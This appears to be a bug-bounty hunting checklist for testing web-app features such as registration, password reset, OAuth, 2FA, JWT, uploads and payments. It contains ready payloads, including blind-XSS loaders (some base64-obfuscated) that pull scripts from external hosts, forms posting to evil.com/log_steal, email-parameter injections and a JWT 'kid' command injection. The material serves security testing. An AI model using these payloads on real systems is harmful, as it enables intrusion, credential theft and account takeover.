---
title: "Hunting Methoodology Checklist"
date: 2023-12-09T11:30:03+00:00
tags: ["bugbounty", "methodology", "checklist"]
categories: ["BugBounty"]
author: "0x0Pwn"
image: "/OTH/BugBountyGuide.jpeg"
comments: false
description: "This is a friendly linux machine that is vulnerable due a low version of Joomla db."
---

> ***Recon***

- [ ] Automation -> [recon-automation.sh](https://github.com/h0tak88r/Scripts/blob/main/bash%20automation/recon-automation.sh)
- [ ] Play With Nuclei -> https://blog.projectdiscovery.io/ultimate-nuclei-guide/
- [ ] Play with FFUF `ffuf -u https://google.com/FUZZ -w Onelistforall/onelistforallshort.txt -mc 200,403`  -> [onelistforall](https://github.com/six2dez/OneListForAll) -> [Seclists](https://github.com/danielmiessler/SecLists) -> [Assetnote](https://www.assetnote.io/)
- [ ] Do some [[Dorking]] Specially Shodan Dorking -> [Dorking](https://github.com/h0tak88r/Web-App-Security/blob/main/Dorking.md)
	- [ ] GitHub Dorking [gitdork-Helper](https://vsec7.github.io/) `pass | pwd | secret | key | private | credential | dbpassword | token`
	- [ ] Google [[Dorking]]
		```python
		# Google
		ext:php | ext:asp | ext:aspx | ext:jsp | ext:asp | ext:pl | ext:cfm | ext:py | ext:rb
		ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt |ext:ora | ext:ini | ext:yaml | ext:yml | ext:rdp | ext:ora | ext:bak | ext:log | ext:confi
		(ext:doc | ext:pdf | ext:xls | ext:txt | ext:ps | ext:rtf | ext:odt | ext:sxw | ext:psw | ext:ppt | ext:pps | ext:xml) intext:confidential salary 
		```
	
	- [ ] Shodan Dorking `ssl.cert.subject.CN:"<specific_hos_name_>"`

- [ ] Check for API Docs
	- Swagger -> `/openapi.json`
	- GraphQL -> https://graphql.org/learn/introspection/ -> https://github.com/prisma-labs/get-graphql-schema 
	- manual -> `site:target.tld intitle:api | developer`
- [ ] Look for API secrets
	- `site:target.tld inurl:api`
	- `intitle:"index of" "api.yaml" site:target.tld`
	- `intitle:"index of" intext:"apikey.txt" site:target.tld`
	- `allintext:"API_SECRET*" ext:env | ext:yml site:target.tld`


>***Low Hanging Fruits***

- [ ] [DNS-ZONE-TRANSFER-CHECKER](https://pentest-tools.com/network-vulnerability-scanning/dns-zone-transfer-check) -> <span style="color:#06ea6c">P4</span>
- [ ] <span style="color:#ffc000">SPF/DMARC</span> Bugs using [mxtoolbox](https://mxtoolbox.com/dmarc.aspx) -> <span style="color:#ffc000">P3</span> -> <span style="color:#06ea6c">DMARC</span> only [DMARC Inspector](https://dmarcian.com/dmarc-inspector/)  -> <span style="color:#06ea6c">P4</span>
- [ ] Check for any <span style="color:#06ea6c">confirmations when deleting password</span> 
- [ ] **<span style="color:#06ea6c">No Rate Limiting on Form</span>** ( Registration, login, Email Triggering, SMS-Triggering )
- [ ] <span style="color:#06ea6c">Missing Secure or HTTPOnly Cookie Flag > Session Token</span>
- [ ] Lack of Security Headers -> <span style="color:#06ea6c">Cache-Control for a Sensitive Page</span>
- [ ] <span style="color:#06ea6c">CAPTCHA  Implementation Vulnerability</span> -> [[CAPTCHA Feature]] 
- [ ] Web Application Firewall (WAF) Bypass -> <span style="color:#06ea6c">Direct Server Access Original IP</span>
- [ ] <span style="color:#06ea6c">Broken Link Hijacking</span> via this [Extension](https://addons.mozilla.org/en-US/firefox/addon/find-broken-links/)
- [ ] <span style="color:#06ea6c">HTML Injection</span> ( Email Triggering , forms, meta tags .... )
- [ ] Failure to Invalidate Session > On <span style="color:#06ea6c">Logout</span> (Client and Server-Side)
    - In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
- [ ] <span style="color:#06ea6c">No Password Policy</span> -> Password:`123`

> ***[[Registration]] Abuse***

 - [ ] <span style="color:#06ea6c">Username/Email Enumeration > Non-Brute Force</span>
- [ ] <span style="font-weight:bold; color:#ff0000">SQL Injection</span>
- [ ] Signup and don't confirm the your email -> change email to others emails like `suppor@bugcrowd.com` -> confirm old email -> ***Email Verification Bypass***
- [ ] Email Verification link <span style="color:#06ea6c">Doesn't Expire After Email Change</span>
- [ ] Verification link **leaked in the response**
- [ ] Verification Bypass via **Response Manipulation**
- [ ] **[Ability to bypass partner email confirmation to take over any store given an employee email](https://hackerone.com/reports/300305)**
- [ ] Signup and don't confirm the your email `emailA@gmail.com` -> change email to others emails like `emaiB@gmail.com` -> confirm new email -> Re-change email to your old Email -> ***Email Verification Bypass***
- [ ] *<span style="font-style:italic; font-style:italic; font-weight:bold; color:#ff0000">ATO</span> or **Duplicate Registration** by **manipulating email parameter (BAC)**
	```python
	H0tak88r@bugcrowdninja.com
	MAybeeEE@GmaiL.coM
	h0tak88r+1@bugcrowdninja.com
	h0tak88r@bugcrowdninja.com a
	h0tak88r%00@bugcrowdninja.com
	h0tak88r%09@bugcrowdninja.com
	h0tak88r%20@bugcrowdninja.com
	victim@gmail.com@attacker.com
	victim@gmail.com@attacker.com
	victim@mail.com%0A%0Dcc:hacker@mail.com
	victim@mail.com%0A%0Dbcc:hacker@mail.com
	{"email":["victim@mail.com","hacker@mail.com"]}
	victim@mail.com&email=hacker@mail.com
	victim@mail.com,hacker@mail.com
	victim@mail.com%20hacker@mail.com
	victim@mail.com|hacker@mail.com
	victim@mail.com&Email=attacker@mail.com
	email@email.com,victim@hack.secry
	email@email“,”victim@hack.secry
	email@email.com:victim@hack.secry
	email@email.com%0d%0avictim@hack.secry
	%0d%0avictim@hack.secry
	%0avictim@hack.secry
	victim@hack.secry%0d%0a
	victim@hack.secry%0a
	victim@hack.secry%0d
	victim@hack.secr%00
	victim@hack.secry{{}}
	victim@gmail.com\n
	```

- [ ] Make 2 Accounts Same in everything [username and another things] but with Different email ID >> **ATO**
- [ ] [Duplicate Registration - The Twinning Twins | by Jerry Shah (Jerry) | Medium](https://shahjerry33.medium.com/duplicate-registration-the-twinning-twins-883dfee59eaf)
- [ ] Create user named: **AdMIn** (uppercase & lowercase letters)
- [ ] Create a user named: **admin=**
- [ ] **SQL Truncation Attack** (when there is some kind of **length limit** in the username or email) --> Create user with name: **admin [a lot of spaces] a**
- [ ] ***OTP BYPASS***
	- Response Manipulation
	- By repeating the form submission multiple times using repeater
	- Brute Forcing
	- [[JSON Tests Cheat Sheet]] -> Array of codes.....
	- Check for default OTP - 111111, 123456, 000000,4242
	- leaked in response
	- old OTP is still valid
	- Integrity Issues -> use someones else OTP to open your account
- [ ]  **PATH Overwrite** 
- [ ] **[[XSS|XSS]] in username/email for registration**

> ***[[CAPTCHA Feature]] Abuse***

- [ ] **[Captcha Bypass via response manipulation](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)**
- [ ] **<span style="color:#06ea6c">Do not send the parameter</span>** related to the captcha.
	- Change from POST to GET or other HTTP Verbs
	- Change to JSON or from JSON
- [ ] Send the **<span style="color:#06ea6c">captcha parameter empty</span>**.
- [ ] Check if the value of the captcha is **<span style="color:#06ea6c">in the source code</span>** of the page.
- [ ] Check if the value is **<span style="color:#06ea6c">inside a cookie</span>.**
- [ ] Try to use an **<span style="color:#06ea6c">old captcha value</span>**
- [ ] Check if you can use the <span style="color:#06ea6c">same captcha</span> **value** several times with **<span style="color:#06ea6c">the same or different session-ID</span>.**
- [ ] If the captcha consists on a **<span style="color:#06ea6c">mathematical operation</span>** try to **<span style="color:#06ea6c">automate</span>** the **<span style="color:#06ea6c">calculation</span>.**
- [ ] Enter CAPTCHA as a Boolean value (`True`)

>***[[Support-Contact us]]***

- [ ] **[There is no rate limit for contact-us endpoints](https://hackerone.com/reports/856305)**
- [ ] [Blind XSS on image upload support chat](https://hackerone.com/reports/1010466)
- [ ] Blind XSS
	```html
	"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Ii8veHNzLnJlcG9ydC9zL004U1pUOCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
	'"><script src=//xss.report/s/M8SZT8></script>
    "><script src="https://js.rip/l5j9hbki0b"></script>
    "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL2w1ajloYmtpMGIiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
	```
- [ ] **[HTML Injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)**
	```html
	https://evil.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaa%20%22<b>hello</b><h1>hacker</h1><a Href='evil.com'>xxxx</a>abc.comxxxxxxxxxxxxxxxxxxxxeeeeeeeeeeaaaaaaaaaaaaacxcccc
	"/><img src="x"><a href="https://evil.com">login</a>
	<button name=xss type=submit formaction='https://google.com'>I get consumed!
	<form action='http://evil.com/log_steal'>
	<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option																<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
	```

> ***[[Reset Password]] Abuse***

- [ ] Failure to Invalidate Session -> On <span style="color:#06ea6c">Password Reset</span> and/or Change
- [ ] <span style="color:#06ea6c">Password Reset Token Sent Over HTTP</span>
- [ ] **0-CLICK** <span style="font-style:italic; font-style:italic; font-weight:bold; color:#ff0000">ATO</span> by **manipulating email parameter (BAC)**
- [ ] **Response Manipulation** -> OTP Bypass -> **0-CLICK** <span style="font-style:italic; font-style:italic; font-weight:bold; font-weight:bold; color:#ff0000">ATO</span>
- [ ] Request password reset -> Enter New Password -> Change Reference -> **IDOR** -> **0-CLICK** <span style="font-weight:bold; color:#ff0000">ATO</span>
- [ ] [[Race Condition]] -> **0-CLICK** <span style="font-weight:bold; color:#ff0000">ATO</span>
- [ ] **OTP** Bypass
    ```python
    1- Completely remove the token
    2- change it to 00000000...
    3- use null/nil value
    4- try expired token
    5- try an array of old tokens
    6- look for race conditions
    7- change 1 char at the begin/end to see if the token is evaluated
    8- use unicode char jutzu to spoof email address
    9- rESPONSE mANIPULATIONF
    ```
- [ ] **[Password reset token leaked via Referer header](https://hackerone.com/reports/1320242)**
- [ ] **[HTML_Injection_on_password_reset_page](https://github.com/KathanP19/HowToHunt/blob/master/HTML_Injection/HTML_Injection_on_password_reset_page.md)**
- [ ] <span style="color:#06ea6c">Token is Not Invalidated After Use</span>
- [ ] Token is Not Invalidated After Email Change/Password Change
	- [Chaturbate | Report #411337 - Forget password link not expiring after email change. | HackerOne](https://hackerone.com/reports/411337)
- [ ] CRLF in URL `/resetPassword?0a%0dHost:atracker.tld` -> <span style="font-weight:bold; color:#ff0000">Host Header Injection</span> 
- [ ] **[IDN Homograph Attack leads to ATO](https://infosecwriteups.com/how-i-was-able-to-change-victims-password-using-idn-homograph-attack-587111843aff)**  
- [ ] `victim.com@attacker.com` -> [0xacb.com/normalization_table](https://0xacb.com/normalization_table) -> <span style="font-style:italic; font-weight:bold; color:#ff0000">Host Header Injection</span> 

>***[[Profile - Settings]]***

- [ ] [Missing rate limit in current password](https://hackerone.com/reports/1170522)
- [ ] [[JSON Tests Cheat Sheet]]
- [ ] [[CSRF]] when changing password/email
- [ ] [password change is confirmed when not matching](https://hackerone.com/reports/803028)
- [ ] Request password change -> Add email parameter and it's value the victim's email -> ATO
- [ ] [[IDOR]]
- [ ] [Abused 2FA to maintain persistence after a password change](https://medium.com/@lukeberner/how-i-abused-2fa-to-maintain-persistence-after-a-password-change-google-microsoft-instagram-7e3f455b71a1)
- [ ] `test.com/user/tester` —> Try Path Overwrite -> `test.com/user/login.php` 
- [ ] Check for Stored-XSS
- [ ] Request change username -> add email parameter -> change email to victim email -> ATO
- [ ] [Insufficient Session Expiration - Previously issued email change tokens do not expire upon issuing a new email change token](https://hackerone.com/reports/1006677 "b'[www.drive2.ru] Insufficient Session Expiration - Previously issued email change tokens do not expire upon issuing a new email change token'")
- [ ] request to change the email to `test@x.y` -> don't confirm and go register account -> then use email changing confirmation link
- [ ] Try [[XSS|XSS]] in email Section ->`"hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com` -> `test@gmail.com%27\\%22%3E%3Csvg/onload=alert(/xss/)%3E`
- [ ] evil@a.com changes mail to 2@gmail.com (owned) -> gets email verification link -> sends link to victim, victim opens and victims account email is updated
- [ ] Change email Confirmation link not expired + OAUTH misconfiguration = ATO
	1. go to account settings and change mail address to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com)
	2. a link will be sent to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com), now the user realizes that he have lost access to [victim](mailto:victim@gmail.com)2[@gmail.com](mailto:victim111@gmail.com) due to some reasons
	3. so he will probably change mail to the another mail address for e.g [victim3@gmail.com](mailto:victim999@gmail.com) which he owns and has access to
	4. but it is found that even after verifying victim3@gmail.com, the old link which was sent to victim2@gmail.com is active, so user/attacker having access to that mail can verify it and Observe the OAuth misconfiguration that leads to account takeover
- [ ] Bypass Disallowed Change Phone Number Feature -> Repeat  Requests `/SetPhoneNumber` and  `/VerifyPhoneNumber` from burp history
- [ ] Check for any <span style="color:#06ea6c">confirmations when deleting password</span> 
- [ ] [CSRF to delete accounts](https://hackerone.com/reports/1629828 ")
- [ ] [[IDOR|IDOR]] in Account Deletion Process
- [ ] Lack of Caching Protection for sensitive information/Responses
- [ ] <span style="color:#06ea6c">Failure to Invalidate Session</span> > On <span style="color:#06ea6c">Logout</span> (Client and Server-Side)
    - In order for this to qualify for the client and server-side variant, you'd need to demonstrate that the session identifiers are not removed from the browser at the time of log out
- [ ] Link Account with Gmail and copy the response -> Attacker request to link with victim gmail -> intercept the response and paste the response from step 1

> ***Testing [[Authorization-Schema]]***

- [ ] Use <span style="color:#06ea6c">account-A</span>'s Cookie/ Authorization-token to access <span style="color:#06ea6c">account-B</span>'s Resources/Objects
- [ ] Use the **newsletter unsubscribe Session** to Access any <span style="font-weight:bold; color:#ff0000">Victim's</span> <span style="font-weight:bold; color:#ff0000">PII</span>
- [ ] **Non-confirmed email** session able to access any of resources that demands **Confirmed-Email** user
- [ ] Look for Leaky API Paths ->  **Excessive Data Exposure** 
- [ ] Testing different HTTP methods (GET, POST, PUT, DELETE, PATCH) will allow level escalation?
- [ ] Check for **Forbidden** Features for **low privilege** user and try to **use** this features
- [ ] Old or previous API versions are running unpatched
- [ ] Use param-miner tool OR [Arjun](https://github.com/s0md3v/Arjun) to guess parameters
- [ ] Do some Parameters-Values Tampers [[JSON Tests Cheat Sheet]]
- [ ] Not Completed 2FA able to access any authenticated endpoints 
- [ ] follow a confirmation link for account `A` within the session of account `B` within an email confirmation flow -> it will link the verified email to account `B`

>***[[Newsletter Feature]]***

- [ ] [[IDOR]] via Changing the newsletter ID 
- [ ] Logout from your account -> check old emails and click to `unsubscribe` button -> this will redirect newsletter subscription/un-subscription Page -> Check Burp History requests sometimes they leaks user details ->  <span style="color:#06ea6c">Excessive Data Exposure</span> 
- [ ] [[CSRF]] for unsubscribe option
- [ ] [[XSS]]  `https://testbuguser.myshopify.com/?contact[email]%20onfocus%3djavascript:alert(%27xss%27)%20autofocus%20a=a&form_type[a]aaa`
- [ ] Unverified User Can Post Newsletter -> https://hackerone.com/reports/1691603 
- [ ] BAC -> Fill the form with other's email -> https://hackerone.com/reports/145396
- [ ] No Rate Limit -> No-Captcha -> Spam Victim ->  https://hackerone.com/reports/145612
- [ ] Host Header Injection -> https://hackerone.com/reports/229498

> ***[[OAUTH to ATO]]***

- [ ] <span style="color:#f06000">Test</span> `edirect_uri` for  [[Open Redirect]] 
- [ ] **[XSS on OAuth authorize/authenticate endpoint](https://hackerone.com/reports/87040)** |  [[XSS]]
- [ ] Test the <span style="color:#f06000">existence</span> of `response_type=token`
- [ ] <span style="color:#f06000">Missing</span> state parameter? 
- [ ] <span style="color:#f06000">Predictable</span> state parameter?
- [ ] Is state parameter being <span style="color:#f06000">verified</span>?
- [ ] <span style="color:#f06000">Change email</span> ->  [[IDOR]] 
- [ ] Option to attach your social media profile to your existing account ? -> <span style="color:#f06000">Forced OAuth profile linking</span>
- [ ] <span style="color:#f06000">Test for</span> [[Web Cache Poisoning]]/<span style="color:#f06000">Deception</span> <span style="color:#f06000">Issues</span>
- [ ] [[SSRF]]
- [ ] <span style="color:#f06000">OAUTH Code Flaws</span> [ Re-usability, Long time, brute force, code x for app y ]
- [ ] Access Token **Scope** Abuse
- [ ] <span style="color:#06ea6c">Disclosure of Secrets</span> -> `client_secret`
- [ ] <span style="color:#06ea6c">Referrer Header leaking Code</span> + State
- [ ] <span style="color:#06ea6c">Access Token Stored in Browser History</span>
- [ ] [Refresh token Abuse](https://medium.com/@iknowhatodo/what-about-refreshtoken-19914d3f2e46)
- [ ] **[Race Conditions in OAuth 2 API implementations](https://hackerone.com/reports/55140)**
- [ ] OAuth Misconfiguration -> <span style="color:#06ea6c">Account Squatting</span> | <span style="color:#06ea6c">Pre-ATO</span>

>***[[2FA Feature]] Abuse***

- [ ] Weak 2FA Implementation > <span style="color:#06ea6c">2FA Secret Cannot be Rotated</span>  
    Rotating the secret means changing this key periodically to enhance security. If the 2FA secret cannot be rotated, it means that once the secret is compromised, an attacker could potentially gain ongoing access to the account without the user’s knowledge, as there is no way for the user to change the secret.
- [ ] Weak 2FA Implementation > <span style="color:#06ea6c">2FA Secret Remains Obtainable After 2FA is Enabled</span>  
    Look for Leaked 2FA Secret after activating 2FA
- [ ] **Bypassing Verification** during <span style="color:#06ea6c">2FA setup</span> via **Response Manipulation**
- [ ] <span style="color:#06ea6c">Old session does not expire</span> after **setup 2FA**
- [ ] <span style="color:#06ea6c">Enable 2FA without verifying the email</span>
- [ ] [IDOR](https://hackerone.com/reports/810880) -> 2FA setup for another user 
- [ ] <span style="color:#ffc000">2FA Code Leakage in Response</span>
- [ ] Lack o<span style="color:#ffc000"></span>f Brute-Force Protection -> <span style="color:#ffc000">2FA Bypass</span>
- [ ] <span style="color:#06ea6c">Missing 2FA Code Integrity Validation</span>
- [ ] <span style="color:#ffc000">Bypass 2FA with null or 000000 or Blanc</span>
- [ ] <span style="color:#ffc000">2FA Referrer Check Bypass | Direct Request</span>
- [ ] Complete the 2FA with your account but do not access the next part, Access it using the victim's Session who still into 2FA page -> <span style="color:#ffc000">2FA Bypassed</span>
- [ ] <span style="color:#ffc000">Changing the 2FA mode Leads to Bypass the code</span>
- [ ] [Race Condition](https://hackerone.com/reports/1747978)
- [ ] <span style="color:#06ea6c">Lack of Brute-Force Protection Disable 2FA</span>
- [ ] <span style="color:#ffc000">Disable 2FA via CSRF</span> 
- [ ] <span style="color:#ffc000">Password Reset/Email Check → Disable 2FA -> 2FA Bypass</span>
- [ ] <span style="color:#ffc000">Backup Code Abuse throw CORS Misconfiguration</span>
- [ ] <span style="color:#06ea6c">Password not checked when 2FA Disable</span>
- [ ] <span style="color:#06ea6c">Clickjacking</span> on 2FA Disabling Page

>***[[JWT Security Testing]]***

- [ ] Edit the JWT with <span style="color:#ff0000">another User ID / Email</span>
- [ ] <span style="color:#06ea6c">Sensitive Data Exposure</span>
- [ ] <span style="color:#ff0000">null signature</span> `python3 jwt_tool.py JWT_HERE -X n`
- [ ] Multiple <span style="color:#ff0000">JWT</span> test cases  
	`python3 jwt_tool.py -t https://api.example.com/api/working_endpoint -rh "Content-Type: application/json" -rh "Authorization: Bearer [JWT]" -M at`
- [ ] Test <span style="color:#ff0000">JWT secret brute-forcing</span>
	`python3 jwt_tool.py <JWT> -C -d <Wordlist>`
- [ ] Abusing <span style="color:#ff0000">JWT Public Keys Without knowing the Public Key</span>
	`https://github.com/silentsignal/rsa_sign2n`
- [ ] <span style="color:#ff0000">Test if algorithm could be changed</span>
	- Change algorithm to None `python3 jwt_tool.py <JWT> -X a`
	- Change algorithm from RS256 to HS256 
	  `python3 jwt_tool.py <JWT> -S hs256 -k public.pem`
	- algorithm confusion with no exposed key -> `docker run --rm -it portswigger/sig2n <token1> <token2>`
- [ ] Test if <span style="color:#ff0000">signature is being validated</span> 
	 `python3 jwt_tool.py <JWT> -I -pc <Key> -pv <Value>`
- [ ] <span style="color:#06ea6c">Test token expiration time</span> (TTL, RTTL) -> change `exp:`
- [ ] Check for <span style="color:#ff0000">Injection in "kid" element </span>
	`python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""`
- [ ] <span style="color:#ff0000">SQL injection</span> in jwt header `admin' ORDER BY 1--`
- [ ] <span style="color:#ff0000">Command injection</span> `kid: key.crt; whoami && python -m SimpleHTTPServer 1337 &`
- [ ] Check that keys and secrets <span style="color:#06ea6c">are different between</span> ENVs

> ***[[File Upload Feature]] Abuse***

Reference:https://brutelogic.com.br/blog/file-upload-xss/

- [ ] Quick Analysis
    ```python
    -----------------------------------------------------------------
    upload.random123		   ---	To test if random file extensions can be uploaded.
    upload.php			       ---	try to upload a simple php file.
    upload.php.jpeg 		   --- 	To bypass the blacklist.
    upload.jpg.php 		     ---	To bypass the blacklist. 
    upload.php 			       ---	and Then Change the content type of the file to image or jpeg.
    upload.php*			       ---	version - 1 2 3 4 5 6 7.
    upload.PHP			       ---	To bypass The BlackList.
    upload.PhP			       ---	To bypass The BlackList.
    upload.pHp			       ---	To bypass The BlackList.
    upload.htaccess 		   --- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
    pixelFlood.jpg			   ---	To test againt the DOS.
    frameflood.gif			   ---	upload gif file with 10^10 Frames
    Malicious zTXT  		   --- 	upload UBER.jpg 
    Upload zip file			   ---	test againts Zip slip (only when file upload supports zip file)
    Check Overwrite Issue	 --- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
    SVG to XSS			       ---	Check if you can upload SVG files and can turn them to cause XSS on the target app
    SQLi Via File upload	 ---	Try uploading `sleep(10)-- -.jpg` as file
    ----------------------------------------------------------------------
    ```
    
- [ ] Test for IDOR By changing the object references [filename, IDs,.....]
- [ ] <span style="color:#06ea6c">EXIF Geo-location Data Not Stripped From Uploaded Images > Manual User Enumeration</span>
- [ ] [xss_comment_exif_metadata_double_quote](https://hackerone.com/reports/964550)
- [ ] <span style="color:#ffc000">XSS</span> in filename `"><img src=x onerror=confirm(88)>.png`
- [ ] <span style="color:#ffc000">XSS</span> metadata `exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ 88.jpeg`
- [ ] <span style="color:#ffc000">XSS</span> in SVG `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`<span style="color:#ffc000"><span style="color:#ffc000"><span style="color:#ffc000"><span style="color:#ffc000"></span></span></span></span>
- [ ] GIF to <span style="color:#ffc000">XSS</span> `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
- [ ] **[XSS in PDF](https://drive.google.com/file/d/1JQ_DVGdopanC59hnf6TF1dOwNsF_wkFY/view)**
- [ ] [ZIP TO XXE](https://hackerone.com/reports/105434)
- [ ] [SQL Injection - File name](https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013)
- [ ] [XXE ON JPEG](https://hackerone.com/reports/836877)
- [ ] [Create A picture that steals Data](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba101)

> ***[[Ban Feature]] Abuse**

- [ ] Try register account with the same name with  you and block him 
 - [ ] **[Banned user still able to invited to reports as a collabrator and reset the password](https://hackerone.com/reports/1959219)**

>***[[Commenting Feature]] Abuse**

- [ ] [[IDOR|IDOR]] Posting comments impersonating some other users.
- [ ] **DOM Clobbering**
- [ ]  Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012)
- [ ] [[IDOR|IDOR]] to Read any other's private comments
- [ ] Race Condition
- [ ] Privilege Escalation

>***[[Chatting Features]]-[[Rich Editor Feature]]***

- [ ] HTML Injection 
- [ ] [[XSS]] in email id
- [ ] Blind XSS
- [ ] XSS Bypass for Rich Text Editors 
	```python
	<</p>iframe src=javascript:alert()//
    <a href="aaa:bbb">x</a>
    <a href="j%26Tab%3bavascript%26colon%3ba%26Tab%3blert()">x</a>
	```
- [ ] Hyperlink Injection `Click on me to claim 100$ vouchers](<https://evil.com>)`
- [ ] Markup Language? try [**Create A picture that steals Data**](https://medium.com/@iframe_h1/a-picture-that-steals-data-ff604ba1012)
- [ ] flood the application using the session data of an old user >  Improper Session Management
- [ ] [[IDOR]]

> ***[[Money Features]] Abuse***

> <span style="font-weight:bold; color:#ff0000">Premium Feature Abuse | Paywall Bypass | Purchasing Feature Abuse</span>

- [ ] Try **forcefully browsing** the areas or some particular endpoints which come under premium accounts
- [ ] **Pay for a premium feature** and cancel your subscription. If you get a **refund** but the feature is still **usable**, it’s a monetary impact issue.
- [ ] Some applications use **true-false request/response values** to validate if a user is having access to premium features or not.
- [ ] Try using **Burp’s Match & Replace to see if you** can replace these values whenever you browse the app & access the premium features.
- [ ] Always check **cookies or local storage** to see if any variable is checking if the user should have access to premium features or not.
- [ ] Buy Products at lower price
    • Add cheap items to the cart. During the payment process, capture the encrypted payment data being sent to the payment gateway.
    • Initiate another shopping process and add expensive/multiple items to the cart. Replace the payment data with the previously captured data.
    • If the application does not cross-validate the data, we’ll be able to buy products at a lower price
- [ ] **IDOR** in Change Price 
	1. make a request to buy anything
	2. try changing the price in request/response
- [ ] **Currency Arbitrage**
	- Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
	- change USD to any poor currency

><span style="font-weight:bold; color:#f06000">Refund Feature Abuse</span>

- [ ] Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
- [ ] Try for currency arbitrage
- [ ] Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.

><span style="font-weight:bold; color:#ffc000">Cart/Wish list Abuse</span>
 
 - [ ] Add a product in **negative quantity** with other products in positive quantity to balance the amount.
 - [ ] Add a product in more than the available quantity.
 - [ ] Try to see when you add a product to your Wish-list and move it to a cart if it is possible to move it to some other user’s cart or delete it from there.

> <span style="font-weight:bold; color:#06ea6c">Orders Page</span>

- [ ] [[IDOR]]
- [ ] Leaking Credit Card Details in Responses -> Exclusive data disclosure

> <span style="font-weight:bold; color:#ff0000">Transfer Money</span>

- [ ] Bypass Transfer Money Limit with negative numbers
- [ ] Borrow Money Without Return by Change the loan return date to --> 31/February

> <span style="font-weight:bold; color:#06ea6c">Gifts Feature</span>

 - [ ] **[Race Condition allows to redeem multiple times gift cards which leads to free "money"](https://hackerone.com/reports/759247)**
 - [ ] **[Race conditions can be used to bypass invitation limit](https://hackerone.com/reports/115007)**

> <span style="font-weight:bold; color:#06ea6c">Discount Checkout</span>

 - [ ] Apply the **same code** more than once to see if the coupon code is reusable.
- [ ] Input the gift code and intercept the request and remove it from the request
- [ ] Manipulate the response when reuse the discount code 
- [ ] Discount is for multiple Items ? collect items and intercept the request change it to one item
- [ ] No Rate Limit --> https://hackerone.com/reports/123091
- [ ] Race Condition--> https://hackerone.com/reports/157996
- [ ] Try Mass Assignment or **HTTP Parameter Pollution** to see if you can add multiple coupon codes while the application only accepts one code from the Client Side.
- [ ] Try performing attacks that are caused by missing input sanitization such as **XSS, SQLi**, etc. on this field
 - [ ] Try adding discount codes on the products which **are not covered under discounted** items by tampering with the request on the server-side.

 > <span style="font-weight:bold; color:#06ea6c">Delivery Charges Abuse</span>

 - [ ] Try tampering with the delivery charge rates to -ve values to see if the final amount can be reduced.
 - [ ] Try checking for the free delivery by tampering with the params.

> ***[[Review Feature]]***

- [ ] Some applications have an option where verified reviews are marked with some tick or it’s mentioned. Try to see if you can post a review as a **Verified Reviewer without purchasing that product**.
- [ ] Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go beyond/below the scale-like **provide 0 or 6 or -ve**.
- [ ] Try to see if the same user can post multiple **ratings for a product**. This is an interesting endpoint to check for **Race Conditions**.
- [ ] Try to see if the file **upload field** is allowing any exts, it’s often observed that the devs miss out on implementing protections on such endpoints.
- [ ] Try to post reviews like some other users.
- [ ] Try **performing CSRF** on this functionality, often is not protected by tokens
- [ ] Get Better Yearly Rates by tampering parameters like  `‘yearly_rate’: ‘3644’` 
